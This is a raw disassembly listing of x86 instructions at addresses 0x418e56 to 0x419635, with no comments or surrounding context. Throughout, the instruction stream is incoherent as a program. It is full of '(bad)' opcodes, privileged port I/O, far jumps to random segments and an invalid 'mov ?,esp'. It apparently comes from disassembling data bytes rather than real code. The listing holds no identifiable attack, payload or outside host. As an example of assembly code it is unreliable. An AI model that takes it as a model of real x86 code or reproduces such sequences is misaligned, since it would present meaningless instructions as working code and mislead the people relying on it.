  418e56:	mov    BYTE PTR [edx-0x2e],dl
  418e59:	add    eax,0xffffffc3
  418e5c:	inc    eax
  418e5d:	jmp    0x172e826b
  418e62:	cld    
  418e63:	loop   0x418ed3
  418e65:	adc    dl,BYTE PTR [edx+0x518ef989]
  418e6b:	xchg   ebp,eax
  418e6c:	aad    0xb4
  418e6e:	mov    ebx,0x9929b1ad
  418e73:	fs retf 0x573
  418e77:	mov    bh,0x8c
  418e79:	fsub   QWORD PTR [ecx+0x5f99d8c1]
  418e7f:	pop    ss
  418e80:	loop   0x418e31
  418e82:	int    0x8e
  418e84:	xchg   BYTE PTR [edx],dl
  418e86:	dec    esi
  418e87:	in     eax,0xcc
  418e89:	mov    dl,0x68
  418e8b:	clc    
  418e8c:	adc    eax,0xe340c357
  418e91:	ds iret 
  418e93:	add    BYTE PTR [edx],dl
  418e95:	jmp    0x8d6f:0x37c5d581
  418e9c:	jg     0x418f03
  418e9e:	std    
  418e9f:	jl     0x418e7e
  418ea1:	dec    edx
  418ea2:	nop
  418ea3:	mov    BYTE PTR [edi+0x689aaeb2],0x80
  418eaa:	adc    al,0x3a
  418eac:	mov    dh,0x1f
  418eae:	mov    esp,0x4fbb0e5a
  418eb3:	dec    edx
  418eb4:	jge    0x418f32
  418eb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418eb7:	ror    DWORD PTR [esi+eiz*8+0x65f8e7f7],1
  418ebe:	shr    esp,cl
  418ec0:	in     eax,0x78
  418ec2:	jg     0x418f41
  418ec4:	jmp    0x418e6f
  418ec6:	ror    DWORD PTR [ebp+0x5c1eaa0e],1
  418ecc:	daa    
  418ecd:	in     eax,0x37
  418ecf:	rcr    BYTE PTR [ebp-0x1e],cl
  418ed2:	adc    DWORD PTR [edx],ebx
  418ed4:	aam    0x8f
  418ed6:	mov    al,ds:0x27bd041
  418edb:	xlat   BYTE PTR es:[ebx]
  418edd:	adc    eax,0xf485029a
  418ee2:	push   cs
  418ee3:	not    dl
  418ee5:	sbb    al,0xec
  418ee7:	data16 das 
  418ee9:	test   BYTE PTR ds:0xc535cf77,ch
  418eef:	repz (bad) 
  418ef1:	jge    0x418f34
  418ef3:	call   0x218d7e0f
  418ef8:	add    al,ah
  418efa:	pop    ds
  418efb:	xchg   edi,eax
  418efc:	xchg   edi,eax
  418efd:	out    0x30,eax
  418eff:	aam    0x45
  418f01:	jae    0x418f5b
  418f03:	push   0x54953062
  418f08:	lods   al,BYTE PTR ds:[esi]
  418f09:	fimul  WORD PTR [eax+0x49]
  418f0c:	nop
  418f0d:	mov    eax,0x16960fae
  418f12:	or     BYTE PTR [edi],ch
  418f14:	lea    esp,[esi-0x25]
  418f17:	jb     0x418ee8
  418f19:	test   al,0x43
  418f1b:	adc    eax,0xb7a40dbd
  418f20:	mov    ebp,0x9aefafba
  418f25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f26:	and    DWORD PTR [edx+edx*8-0x52],ebx
  418f2a:	mov    ah,0xc6
  418f2c:	lds    ebp,FWORD PTR [ecx+eiz*8-0x4e841ea0]
  418f33:	push   ss
  418f34:	sub    al,BYTE PTR [edi]
  418f36:	adc    BYTE PTR [edi+0x594d34c5],dh
  418f3c:	clc    
  418f3d:	mov    eax,0x18b1e4b7
  418f42:	push   esp
  418f43:	inc    esi
  418f44:	out    0x25,al
  418f46:	and    esp,DWORD PTR [esi+ecx*8]
  418f49:	fadd   DWORD PTR [ebp+0x1e9b6be6]
  418f4f:	add    ch,bl
  418f51:	mov    esi,0x37c1ff5b
  418f56:	scas   eax,DWORD PTR es:[edi]
  418f57:	push   edx
  418f58:	push   esi
  418f59:	push   eax
  418f5a:	(bad)  
  418f5b:	xor    BYTE PTR [ebp-0x2f9706d9],al
  418f61:	or     dh,cl
  418f63:	xchg   esi,eax
  418f64:	push   es
  418f65:	or     BYTE PTR [esi-0x4d2dddb],cl
  418f6b:	jns    0x418f3e
  418f6d:	mov    ds:0xb9f42a50,eax
  418f72:	aad    0x78
  418f74:	jg     0x418efa
  418f76:	shl    DWORD PTR [edx-0xb],1
  418f79:	shl    DWORD PTR ds:0xfdeb4c05,cl
  418f7f:	cwde   
  418f80:	test   BYTE PTR [ebx],bl
  418f82:	ret    
  418f83:	in     eax,dx
  418f84:	cmp    esp,DWORD PTR [ecx]
  418f86:	inc    edi
  418f87:	stc    
  418f88:	aam    0x76
  418f8a:	mov    ecx,0xac8b1482
  418f8f:	sbb    eax,0x5ae21c71
  418f94:	cmp    BYTE PTR [ebp+0x4ee84faf],cl
  418f9a:	retf   
  418f9b:	int3   
  418f9c:	jp     0x419000
  418f9e:	inc    edi
  418f9f:	pop    ss
  418fa0:	inc    esp
  418fa1:	mov    cl,0x3a
  418fa3:	(bad)  [bx+0x6b0b]
  418fa8:	cmp    eax,0x3520fb69
  418fad:	cli    
  418fae:	popa   
  418faf:	push   0xd3dd991b
  418fb4:	xchg   ecx,eax
  418fb5:	mov    ecx,0xbee8947f
  418fba:	and    al,0xf9
  418fbc:	inc    eax
  418fbd:	test   BYTE PTR [eax-0xd],al
  418fc0:	bound  esi,QWORD PTR [ebp+0x3ebec4a3]
  418fc6:	lds    eax,FWORD PTR [edi]
  418fc8:	dec    edi
  418fc9:	xor    bl,BYTE PTR cs:[ecx+0x221d470c]
  418fd0:	xor    BYTE PTR [edx],cl
  418fd2:	repz test eax,0x2465e27d
  418fd8:	cmp    BYTE PTR [ebp+edi*4-0x66da7b32],cl
  418fdf:	aas    
  418fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418fe1:	ins    DWORD PTR es:[edi],dx
  418fe2:	xchg   BYTE PTR [ecx],dh
  418fe4:	sbb    ecx,DWORD PTR [eax+0x19]
  418fe7:	mov    eax,0x423eeee3
  418fec:	xlat   BYTE PTR fs:[ebx]
  418fee:	mov    bl,0x84
  418ff0:	jmp    0x41900f
  418ff2:	sti    
  418ff3:	xor    ecx,DWORD PTR [ebx]
  418ff5:	and    DWORD PTR [ebp-0x3b],ebp
  418ff8:	jbe    0x418f8f
  418ffa:	pop    ds
  418ffb:	pop    ss
  418ffc:	inc    ecx
  418ffd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418ffe:	mov    ds:0x78d69471,al
  419003:	pop    edx
  419004:	ja     0x41907c
  419006:	repz cld 
  419008:	pop    edx
  419009:	out    dx,al
  41900a:	jo     0x418fe6
  41900c:	test   ecx,0xa0b5c0b
  419012:	shl    cl,cl
  419014:	adc    al,0xa
  419016:	ret    
  419017:	push   esp
  419018:	outs   dx,BYTE PTR ds:[esi]
  419019:	inc    edx
  41901a:	data16 or ch,ch
  41901d:	mov    al,0xf1
  41901f:	mov    ebp,0x10301166
  419024:	ret    
  419025:	and    dl,BYTE PTR [ebx*4-0x4a174cce]
  41902c:	int    0x35
  41902e:	out    dx,eax
  41902f:	add    al,0xc5
  419031:	pusha  
  419032:	cs jbe 0x419042
  419035:	xor    al,BYTE PTR [edi]
  419037:	in     al,dx
  419038:	popf   
  419039:	or     cl,bh
  41903b:	pop    ebp
  41903c:	test   ecx,0x34446595
  419042:	add    BYTE PTR [edx+ecx*2],ah
  419045:	push   ss
  419046:	pop    ds
  419047:	sub    esp,eax
  419049:	iret   
  41904a:	cmp    BYTE PTR [ecx+ecx*4],al
  41904d:	shr    BYTE PTR [ecx],cl
  41904f:	pop    edi
  419050:	xchg   DWORD PTR ds:[edi+0x4d],ebp
  419054:	cld    
  419055:	inc    ecx
  419056:	hlt    
  419057:	push   ds
  419058:	sbb    al,BYTE PTR [esi-0x55]
  41905b:	fst    QWORD PTR [eax+0x3b19ddee]
  419061:	pop    ss
  419062:	sbb    BYTE PTR [eax],bh
  419064:	test   al,0x3
  419066:	(bad)  
  419067:	xor    dl,BYTE PTR [edx+0x6e]
  41906a:	cwde   
  41906b:	mov    WORD PTR [ecx+eiz*1],gs
  41906e:	add    dh,BYTE PTR [edi-0x600bdf8b]
  419074:	adc    BYTE PTR [edx],dh
  419076:	daa    
  419077:	jle    0x4190a6
  419079:	rcl    DWORD PTR fs:[edx-0x578a4deb],cl
  419080:	mov    eax,ds:0xe5ca14c0
  419085:	stos   DWORD PTR es:[edi],eax
  419086:	or     al,0x24
  419089:	jmp    0xa53e:0x6a2d2d36
  419090:	add    dl,BYTE PTR [eax]
  419092:	cwde   
  419093:	loope  0x41907b
  419095:	sbb    BYTE PTR [edi+0x3d8b3966],bl
  41909b:	adc    al,0x4d
  41909d:	mov    al,ds:0x59ff4bb2
  4190a2:	rcl    BYTE PTR [edx-0x4d918810],1
  4190a8:	ja     0x419039
  4190aa:	mov    BYTE PTR [ecx],al
  4190ac:	int3   
  4190ad:	sbb    al,0x7c
  4190af:	fimul  WORD PTR [esi-0x37a70a45]
  4190b5:	inc    ebx
  4190b6:	aaa    
  4190b7:	jae    0x4190bf
  4190b9:	mov    ebx,0x7a1342fa
  4190be:	jmp    0x9f0f3a9c
  4190c3:	stos   DWORD PTR es:[edi],eax
  4190c4:	xchg   BYTE PTR [edx-0x78],dl
  4190c7:	mov    esp,0x51544be3
  4190cc:	icebp  
  4190cd:	outs   dx,DWORD PTR ds:[esi]
  4190ce:	cmc    
  4190cf:	and    esp,DWORD PTR [edi+0x43]
  4190d2:	in     eax,dx
  4190d3:	sbb    edi,edi
  4190d5:	xchg   BYTE PTR [ecx-0x4fe1ab95],dh
  4190db:	test   ah,dh
  4190dd:	sbb    BYTE PTR [edx+0xa8defbc],dh
  4190e3:	in     eax,dx
  4190e4:	lea    eax,[ebx]
  4190e6:	in     al,dx
  4190e7:	jecxz  0x419129
  4190e9:	fucomip st,st(0)
  4190eb:	mov    al,ds:0xb49b350
  4190f0:	dec    ebx
  4190f1:	or     eax,0xbc5d805a
  4190f6:	loope  0x4190e8
  4190f8:	jle    0x4190f3
  4190fa:	dec    eax
  4190fb:	push   es
  4190fc:	fnstsw WORD PTR [edx+edi*4]
  4190ff:	mov    bl,0x48
  419101:	or     esp,DWORD PTR [edi-0x7610801]
  419107:	ins    BYTE PTR es:[edi],dx
  419108:	mov    bh,dl
  41910a:	mov    esp,DWORD PTR [edi-0x7673e269]
  419110:	adc    al,0xaa
  419112:	ins    DWORD PTR es:[edi],dx
  419113:	fwait
  419114:	mov    eax,0x4e2ac42d
  419119:	xor    esp,DWORD PTR [di-0x10]
  41911d:	xor    ecx,DWORD PTR [ebx-0x1]
  419120:	popa   
  419121:	pop    ecx
  419122:	jecxz  0x4190ae
  419124:	inc    ebx
  419125:	test   DWORD PTR [ebx-0x1078a7a0],edx
  41912b:	adc    esi,DWORD PTR [esi]
  41912d:	xor    DWORD PTR [edi+0x1f7160a1],edx
  419133:	push   edi
  419134:	cs push ecx
  419136:	sub    BYTE PTR ds:[eax],bl
  419139:	xchg   BYTE PTR [eax-0x496a3ce8],dh
  41913f:	inc    edx
  419140:	fisubr WORD PTR [ebx+0x304cdffe]
  419146:	mov    ds:0xc732907f,al
  41914b:	push   es
  41914c:	fstp   DWORD PTR [ebx+ecx*2+0x10]
  419150:	jg     0x41910c
  419152:	xor    ah,0xf8
  419155:	ins    DWORD PTR es:[edi],dx
  419156:	rol    BYTE PTR [edi],1
  419158:	adc    BYTE PTR ds:0x4dd3aa09,cl
  41915e:	gs inc ebp
  419160:	(bad)  
  419161:	cmp    BYTE PTR [edi-0x5a],dh
  419164:	fisub  DWORD PTR [edx+ebx*4]
  419167:	les    ebp,FWORD PTR [eax]
  419169:	jb     0x419171
  41916b:	enter  0x46b1,0x14
  41916f:	(bad)  
  419170:	sub    al,0xa6
  419172:	dec    ebp
  419173:	leave  
  419174:	imul   esp,DWORD PTR [eax-0x40cf5267],0xffffffb8
  41917b:	mov    BYTE PTR [edx+0x55],bl
  41917e:	out    0xd5,al
  419180:	jne    0x4191b3
  419182:	dec    ebx
  419183:	test   al,0x49
  419185:	(bad)  
  419186:	out    0x8e,al
  419188:	dec    esi
  419189:	cmp    dl,ah
  41918b:	jge    0x41911e
  41918d:	sub    eax,0x5c954fdd
  419192:	jnp    0x4191cc
  419194:	mov    ecx,0x2bbc45cb
  419199:	vrsqrtss xmm1,xmm6,DWORD PTR [edi]
  41919d:	fadd   QWORD PTR [edi+0x64ce5b56]
  4191a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4191a4:	out    dx,eax
  4191a5:	or     edx,0x2a43036d
  4191ab:	push   edx
  4191ac:	mov    ebp,0x21f0c9aa
  4191b1:	pop    ds
  4191b2:	add    BYTE PTR [esi],0x6a
  4191b5:	rcl    BYTE PTR [esi+0x6d],0x55
  4191b9:	in     eax,dx
  4191ba:	js     0x4191f9
  4191bc:	xor    ch,BYTE PTR [edi]
  4191be:	rol    ebp,0x18
  4191c1:	adc    BYTE PTR ds:0x419a636b,ah
  4191c7:	loop   0x419197
  4191c9:	and    eax,0x772f8a1b
  4191ce:	pop    esi
  4191cf:	dec    ebx
  4191d0:	cmc    
  4191d1:	push   eax
  4191d2:	mov    ebp,0xca4f8fd0
  4191d7:	sbb    bh,dh
  4191d9:	xchg   ebx,eax
  4191da:	test   eax,0x2a4f0c45
  4191df:	push   edi
  4191e0:	inc    esi
  4191e1:	fsub   st(4),st
  4191e3:	add    al,0x60
  4191e5:	fmul   QWORD PTR [edi]
  4191e7:	not    ecx
  4191e9:	addr16 xor al,0x1e
  4191ec:	pop    ecx
  4191ed:	pop    edi
  4191ee:	cdq    
  4191ef:	(bad)  
  4191f0:	add    ah,BYTE PTR [ecx+0x11]
  4191f3:	adc    eax,0x13e54bb9
  4191f8:	scas   eax,DWORD PTR es:[edi]
  4191f9:	sbb    BYTE PTR [ecx+0x75],dl
  4191fc:	push   ecx
  4191fd:	dec    esp
  4191fe:	mov    bl,0xa6
  419200:	push   ebp
  419201:	(bad)  
  419202:	cli    
  419203:	jo     0x419280
  419205:	stos   DWORD PTR es:[edi],eax
  419206:	in     al,0x19
  419208:	imul   DWORD PTR [edx-0x2e]
  41920b:	xor    dl,ah
  41920d:	or     ebp,DWORD PTR [ebp-0x53]
  419210:	scas   eax,DWORD PTR es:[edi]
  419211:	cmp    ch,BYTE PTR ds:0x2ffb0095
  419217:	ds xchg ecx,eax
  419219:	fsub   DWORD PTR [edx-0x21275866]
  41921f:	cs add al,0x95
  419222:	sub    DWORD PTR [ebx-0x5a],edi
  419225:	into   
  419226:	loope  0x4191cc
  419228:	popf   
  419229:	pop    esp
  41922a:	add    al,0x33
  41922c:	in     al,dx
  41922d:	push   ecx
  41922e:	ja     0x419210
  419230:	imul   esp,DWORD PTR ds:0x690cc120,0x63bd3d92
  41923a:	dec    esi
  41923b:	(bad)  
  41923c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41923d:	push   es
  41923e:	inc    ebp
  41923f:	sub    BYTE PTR [ebx],ch
  419241:	inc    edx
  419242:	jle    0x4192b9
  419244:	sti    
  419245:	out    dx,al
  419246:	push   0xffffffd3
  419248:	jl     0x4192c5
  41924a:	outs   dx,BYTE PTR ds:[esi]
  41924b:	jbe    0x4192ba
  41924d:	xchg   dh,al
  41924f:	add    bl,BYTE PTR [edi]
  419251:	fwait
  419252:	mov    al,0xea
  419254:	jg     0x41926b
  419256:	adc    ebp,ebx
  419258:	in     al,0x11
  41925a:	sbb    BYTE PTR [ecx+esi*4-0x1a],dh
  41925e:	jmp    0x419274
  419260:	xor    DWORD PTR fs:[edx],edx
  419263:	das    
  419264:	dec    ebp
  419265:	sbb    al,cl
  419267:	push   es
  419268:	sub    eax,0x4757b7cf
  41926d:	sub    al,0x98
  41926f:	rcr    DWORD PTR [ecx-0x214b4e2c],1
  419275:	or     esp,DWORD PTR [esi-0x49e81acc]
  41927b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41927c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927d:	fcomp  st(0)
  41927f:	and    cl,BYTE PTR [ecx+edi*1]
  419282:	pop    esi
  419283:	sbb    eax,0xb18ec610
  419288:	sbb    eax,0x7efe6bb5
  41928d:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41928f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419290:	ror    BYTE PTR [ecx],1
  419292:	jp     0x4192e0
  419294:	sar    DWORD PTR [esi+0x6082120],1
  41929a:	(bad)  
  41929b:	lock push ebx
  41929d:	sbb    eax,0xa616c18a
  4192a2:	arpl   WORD PTR [ebx-0x77],ax
  4192a5:	in     eax,dx
  4192a6:	and    al,0xa8
  4192a8:	call   0x1a6d:0xe9a2f082
  4192af:	xchg   edi,eax
  4192b0:	add    bh,BYTE PTR [ebp+0x1429d6da]
  4192b6:	mov    al,0xd3
  4192b8:	xor    DWORD PTR [eax],esp
  4192ba:	(bad)
  4192bd:	es cmp al,0x46
  4192c1:	mov    edx,0x20bf36df
  4192c6:	mov    al,ds:0xbf72c443
  4192cb:	and    DWORD PTR ds:[edi-0x56],edi
  4192cf:	retf   0xd6c
  4192d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192d3:	mov    edi,0x52e700
  4192d8:	cwde   
  4192d9:	scas   al,BYTE PTR es:[edi]
  4192da:	pop    ecx
  4192db:	inc    ecx
  4192dc:	inc    esi
  4192dd:	jb     0x4192b5
  4192df:	mov    esp,0x50146390
  4192e4:	jmp    0xafdf:0xc9a36717
  4192eb:	xchg   esi,eax
  4192ec:	js     0x419315
  4192ee:	xchg   esp,eax
  4192ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192f0:	scas   eax,DWORD PTR es:[edi]
  4192f1:	fist   DWORD PTR [eax+ebp*1+0x1b9ac2d4]
  4192f8:	mov    fs,ebx
  4192fa:	cmp    al,0xa6
  4192fc:	xor    BYTE PTR [eax+0x40],ch
  4192ff:	popf   
  419300:	sub    BYTE PTR [ebx+0xa],dl
  419303:	and    ch,0xea
  419306:	inc    ebx
  419307:	call   DWORD PTR [ecx-0x22]
  41930a:	dec    ecx
  41930b:	pause  
  41930d:	xor    ebp,eax
  41930f:	push   DWORD PTR [esi]
  419311:	mov    al,ds:0x87dc2209
  419316:	ror    BYTE PTR [ebx],cl
  419318:	pop    edi
  419319:	xchg   ebx,eax
  41931a:	je     0x419380
  41931c:	dec    eax
  41931d:	mov    WORD PTR [esi],es
  41931f:	push   es
  419320:	mov    WORD PTR [esi+0x34],ds
  419323:	jg     0x4192d9
  419325:	(bad)  
  419327:	mov    dl,0x90
  419329:	adc    cl,al
  41932b:	jmp    0x831e7058
  419330:	inc    edi
  419331:	mov    bl,0x4e
  419333:	(bad)  
  419334:	sbb    eax,0xf9cdcea7
  419339:	jecxz  0x419363
  41933b:	addr16 jge 0x4193aa
  41933e:	dec    ebp
  41933f:	xchg   ecx,eax
  419340:	aas    
  419341:	clc    
  419342:	das    
  419343:	xor    ch,ch
  419345:	or     BYTE PTR [esi-0x3a],ch
  419348:	cld    
  419349:	sbb    BYTE PTR [edi],bl
  41934b:	mov    edx,DWORD PTR [eax-0x3e34ad4f]
  419351:	rol    BYTE PTR [ecx-0x44],1
  419354:	lds    edi,FWORD PTR [ecx+0x5b]
  419357:	jae    0x4192f2
  419359:	jae    0x4193b0
  41935b:	fsub   QWORD PTR [eax+0x30507a44]
  419361:	cdq    
  419362:	jnp    0x419384
  419364:	and    edx,DWORD PTR [eax+0x12]
  419367:	jle    0x41930c
  419369:	sub    edx,eax
  41936b:	arpl   WORD PTR [ecx],cx
  41936d:	pop    ecx
  41936e:	push   eax
  41936f:	stos   BYTE PTR es:[edi],al
  419370:	neg    BYTE PTR [ebx]
  419372:	inc    ebp
  419373:	add    BYTE PTR ds:0xf859fe78,al
  419379:	retf   0x3753
  41937c:	jo     0x4193ef
  41937e:	push   DWORD PTR [eax+0x6526344a]
  419384:	fsubr  DWORD PTR ds:0x1a59a845
  41938a:	jns    0x4193cf
  41938c:	sub    DWORD PTR [eax],esi
  41938e:	aad    0xd2
  419390:	cwde   
  419391:	xchg   BYTE PTR [ecx],bh
  419393:	mov    cl,0x5d
  419395:	popa   
  419396:	shr    DWORD PTR [edx],cl
  419398:	adc    dl,BYTE PTR [ebp+0x3a]
  41939b:	add    eax,0xac1ebf02
  4193a0:	push   0xffffff8b
  4193a2:	ins    BYTE PTR es:[edi],dx
  4193a3:	out    dx,al
  4193a4:	cli    
  4193a5:	xchg   ebx,eax
  4193a6:	mov    cl,0x75
  4193a8:	(bad)  
  4193a9:	es icebp 
  4193ab:	and    esp,DWORD PTR ds:0x2f810dd2
  4193b1:	sub    al,0x5
  4193b3:	jmp    0xa73:0xebb0f13e
  4193ba:	adc    DWORD PTR [eax],esp
  4193bc:	aaa    
  4193bd:	ds sbb eax,0xae26684e
  4193c3:	xchg   esp,eax
  4193c4:	test   DWORD PTR [ebp+0x70],0x4dfac670
  4193cb:	sub    edi,DWORD PTR [ebp+esi*4-0x48]
  4193cf:	inc    esp
  4193d0:	xchg   esp,eax
  4193d1:	mov    cl,0xd4
  4193d3:	cmp    al,0x7d
  4193d5:	mov    edx,0xe5b8a7fd
  4193da:	cmp    DWORD PTR [edx],esi
  4193dc:	sti    
  4193dd:	adc    ebx,DWORD PTR [edi-0x630ccf40]
  4193e3:	push   0xbfc5ea91
  4193e8:	cmc    
  4193e9:	sub    eax,0x955e937d
  4193ee:	(bad)  
  4193f0:	and    eax,0xa4d49be9
  4193f5:	pop    ss
  4193f6:	imul   ecx,DWORD PTR [edi+0x4b],0x36
  4193fa:	mov    bl,0x34
  4193fc:	inc    edi
  4193fd:	gs push es
  4193ff:	sbb    dl,0x39
  419402:	out    dx,eax
  419403:	push   cs
  419404:	addr16 pusha 
  419406:	push   ds
  419407:	sub    DWORD PTR [ebx],0x45
  41940a:	push   ds
  41940b:	das    
  41940c:	and    al,0x48
  41940e:	test   al,0x77
  419410:	xor    al,0x77
  419412:	fiadd  DWORD PTR cs:[esi-0x71]
  419416:	xchg   ebx,eax
  419417:	and    al,0x70
  419419:	int    0xd7
  41941b:	mov    dl,0x5b
  41941d:	xor    BYTE PTR [edx-0x55],dl
  419420:	pop    esp
  419421:	cmc    
  419422:	(bad)  
  419423:	cmp    esp,DWORD PTR [eax+0x62]
  419426:	ret    0x2c6b
  419429:	dec    esi
  41942a:	dec    eax
  41942b:	loop   0x41948a
  41942d:	pop    edi
  41942e:	xchg   edi,eax
  41942f:	jbe    0x4194ab
  419431:	push   ecx
  419432:	mov    esp,0x6127354e
  419437:	addr16 pop esp
  419439:	sbb    BYTE PTR [ebx-0x4af107c4],dl
  41943f:	repz xchg edi,eax
  419441:	ins    DWORD PTR es:[edi],dx
  419442:	aas    
  419443:	and    ah,BYTE PTR ds:0xd2ec1a5c
  419449:	xor    al,bl
  41944b:	pop    ds
  41944c:	pushf  
  41944d:	inc    eax
  41944e:	cmp    eax,0x93144ed7
  419453:	mov    ch,0x48
  419455:	jbe    0x41949c
  419457:	scas   eax,DWORD PTR es:[edi]
  419458:	shl    BYTE PTR [eax-0x45],0x79
  41945c:	aad    0x91
  41945e:	int    0x7c
  419460:	adc    esp,edx
  419462:	hlt    
  419463:	or     dh,al
  419465:	mov    cl,0x45
  419467:	mov    ?,esp
  419469:	inc    edx
  41946a:	mov    edi,0x9f8afc0c
  41946f:	enter  0xcecd,0x61
  419473:	cmp    ch,al
  419475:	pop    ds
  419476:	mov    ds:0x95a30a69,eax
  41947b:	mov    dh,dl
  41947d:	jl     0x4194d8
  41947f:	sub    al,0xee
  419481:	int    0xfc
  419483:	lea    eax,[ecx+ebp*8]
  419486:	out    dx,eax
  419487:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419488:	repz in eax,0x8e
  41948b:	mov    bl,0xc8
  41948d:	icebp  
  41948e:	mov    dh,0x56
  419490:	cmp    bl,BYTE PTR [eax+0x6d]
  419493:	retf   0xd40a
  419496:	xchg   BYTE PTR [ebp+edi*4-0x7d],ch
  41949a:	mov    ebx,0xe7c558a
  41949f:	test   DWORD PTR [esp+edx*8-0x4c85e2c9],0x4f0997dd
  4194aa:	jbe    0x419464
  4194ac:	add    dl,BYTE PTR [edx-0x3b34835f]
  4194b2:	(bad)  [ebx-0xfd49a52]
  4194b8:	cld    
  4194b9:	pop    ebx
  4194ba:	sbb    DWORD PTR [ebx+ebp*4],edi
  4194bd:	xor    edi,DWORD PTR [ecx+0x218eecf7]
  4194c3:	push   cs
  4194c4:	fbld   TBYTE PTR [edi]
  4194c6:	stc    
  4194c7:	aas    
  4194c8:	scas   eax,DWORD PTR es:[edi]
  4194c9:	sub    eax,0x77e1a1d7
  4194ce:	(bad)  
  4194cf:	jmp    FWORD PTR [edi+0x29]
  4194d2:	mov    eax,0x215fe102
  4194d7:	cs das 
  4194d9:	adc    DWORD PTR [edi],ebx
  4194db:	push   ds
  4194dc:	rcr    DWORD PTR fs:[esi+0x18c66474],0x8a
  4194e4:	or     al,0xbf
  4194e6:	out    0x9,eax
  4194e8:	push   eax
  4194e9:	cli    
  4194ea:	fnstcw WORD PTR [edi]
  4194ec:	loope  0x419472
  4194ee:	or     al,bh
  4194f0:	es mov esp,0x7f5a25b9
  4194f6:	and    eax,DWORD PTR [ebx]
  4194f8:	ins    BYTE PTR es:[edi],dx
  4194f9:	inc    ebp
  4194fa:	pop    es
  4194fb:	sub    ebp,esp
  4194fd:	push   eax
  4194fe:	and    eax,0xd90648a6
  419503:	cmc    
  419504:	aad    0xc4
  419506:	adc    edi,esp
  419508:	(bad)  
  419509:	adc    ah,bl
  41950b:	std    
  41950c:	sbb    bh,BYTE PTR [edi]
  41950e:	(bad)  
  419510:	jae    0x4194e5
  419512:	ds retf 0x6ce6
  419516:	mov    esi,0x330f0eb7
  41951b:	ds fwait
  41951d:	aad    0xf0
  41951f:	mov    ah,0xad
  419521:	lock mov si,0x4334
  419526:	jne    0x419555
  419528:	ins    BYTE PTR es:[edi],dx
  419529:	outs   dx,DWORD PTR ds:[esi]
  41952a:	jno    0x4194b0
  41952c:	jmp    0x4194bb
  41952e:	sahf   
  41952f:	repz sub BYTE PTR [edi-0x559bebc5],dl
  419536:	push   esi
  419537:	mov    ds:0x351be9e0,eax
  41953c:	mov    eax,ds:0x81fb1c1f
  419541:	mov    al,ds:0xded33c7e
  419546:	(bad)
  41954a:	dec    ecx
  41954b:	jne    0x419505
  41954d:	cmp    al,0x8f
  41954f:	sbb    al,0xcd
  419551:	sub    edx,ebp
  419553:	or     al,0xc6
  419555:	shr    DWORD PTR [edi],cl
  419557:	mov    dh,0xa3
  419559:	iret   
  41955a:	xchg   esi,eax
  41955b:	dec    esi
  41955c:	add    esi,edi
  41955e:	inc    BYTE PTR [edi+eiz*8-0x34]
  419562:	stos   DWORD PTR es:[edi],eax
  419563:	aad    0xe8
  419565:	add    al,0x2
  419567:	adc    ebp,ebx
  419569:	push   0x70
  41956b:	push   es
  41956c:	mov    esp,0xdadc72e2
  419571:	pop    es
  419572:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419574:	cmp    esi,ecx
  419576:	arpl   WORD PTR [ebx-0x51b98eb1],bx
  41957c:	adc    BYTE PTR [edi-0x674d041e],al
  419582:	aad    0xf6
  419584:	sbb    DWORD PTR [ecx*1-0x675313b3],ecx
  41958b:	xchg   BYTE PTR [ecx+0x5f],bl
  41958e:	pop    ds
  41958f:	inc    ebx
  419590:	mov    edx,0x989f86da
  419595:	jns    0x41957d
  419597:	jbe    0x4195bd
  419599:	push   edx
  41959a:	cs int 0xbf
  41959d:	inc    esi
  41959e:	sub    DWORD PTR ds:0x7af638f1,edi
  4195a4:	sbb    BYTE PTR [ebx+edx*8],0xc8
  4195a8:	sti    
  4195a9:	dec    ecx
  4195aa:	popa   
  4195ab:	repnz xchg edx,eax
  4195ad:	inc    ebp
  4195ae:	sbb    DWORD PTR [ecx+0x50],ecx
  4195b1:	dec    ecx
  4195b2:	shl    DWORD PTR [ecx],1
  4195b4:	push   0xb5450474
  4195b9:	fiadd  WORD PTR [ecx-0xe7b432a]
  4195bf:	loope  0x419545
  4195c1:	inc    eax
  4195c2:	jp     0x4195a3
  4195c4:	fmul   DWORD PTR [ecx]
  4195c6:	xchg   esp,eax
  4195c7:	aaa    
  4195c8:	fdiv   QWORD PTR [ebp+0x332b4629]
  4195ce:	adc    al,0xef
  4195d0:	stos   DWORD PTR es:[edi],eax
  4195d1:	or     eax,0x369cc316
  4195d6:	stos   DWORD PTR es:[edi],eax
  4195d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195d8:	ror    DWORD PTR [esi+0x4213984b],0x3
  4195df:	or     BYTE PTR [esp+esi*2+0x5ee4db48],0x63
  4195e7:	das    
  4195e8:	push   ebx
  4195e9:	pop    ebx
  4195ea:	cmp    DWORD PTR [esi],ebp
  4195ec:	xchg   esi,eax
  4195ed:	xor    BYTE PTR [eax+0x1d],dl
  4195f0:	push   0x1969f34e
  4195f5:	jns    0x4195ee
  4195f7:	cmp    edx,DWORD PTR [ebp+0x7c08c50]
  4195fd:	sar    esp,1
  4195ff:	xor    dl,bh
  419601:	inc    esp
  419602:	mov    ebx,edi
  419604:	push   cs
  419605:	rcl    BYTE PTR [ebx+0x7f9d0d1c],cl
  41960b:	fwait
  41960c:	xor    ch,BYTE PTR [ecx-0x5982b1ba]
  419612:	gs pop es
  419614:	pop    edx
  419615:	jmp    0x41d1a5a2
  41961a:	int    0xa6
  41961c:	sbb    al,0x9
  41961e:	cmp    ah,BYTE PTR [edx-0x4d]
  419621:	aas    
  419622:	push   0xd29cd06d
  419627:	out    0xa5,al
  419629:	call   0x52b4:0x56a5997d
  419630:	popf   
  419631:	cld    
  419632:	add    bl,BYTE PTR [edi]
  419634:	xchg   edx,eax
  419635:	inc    ebx
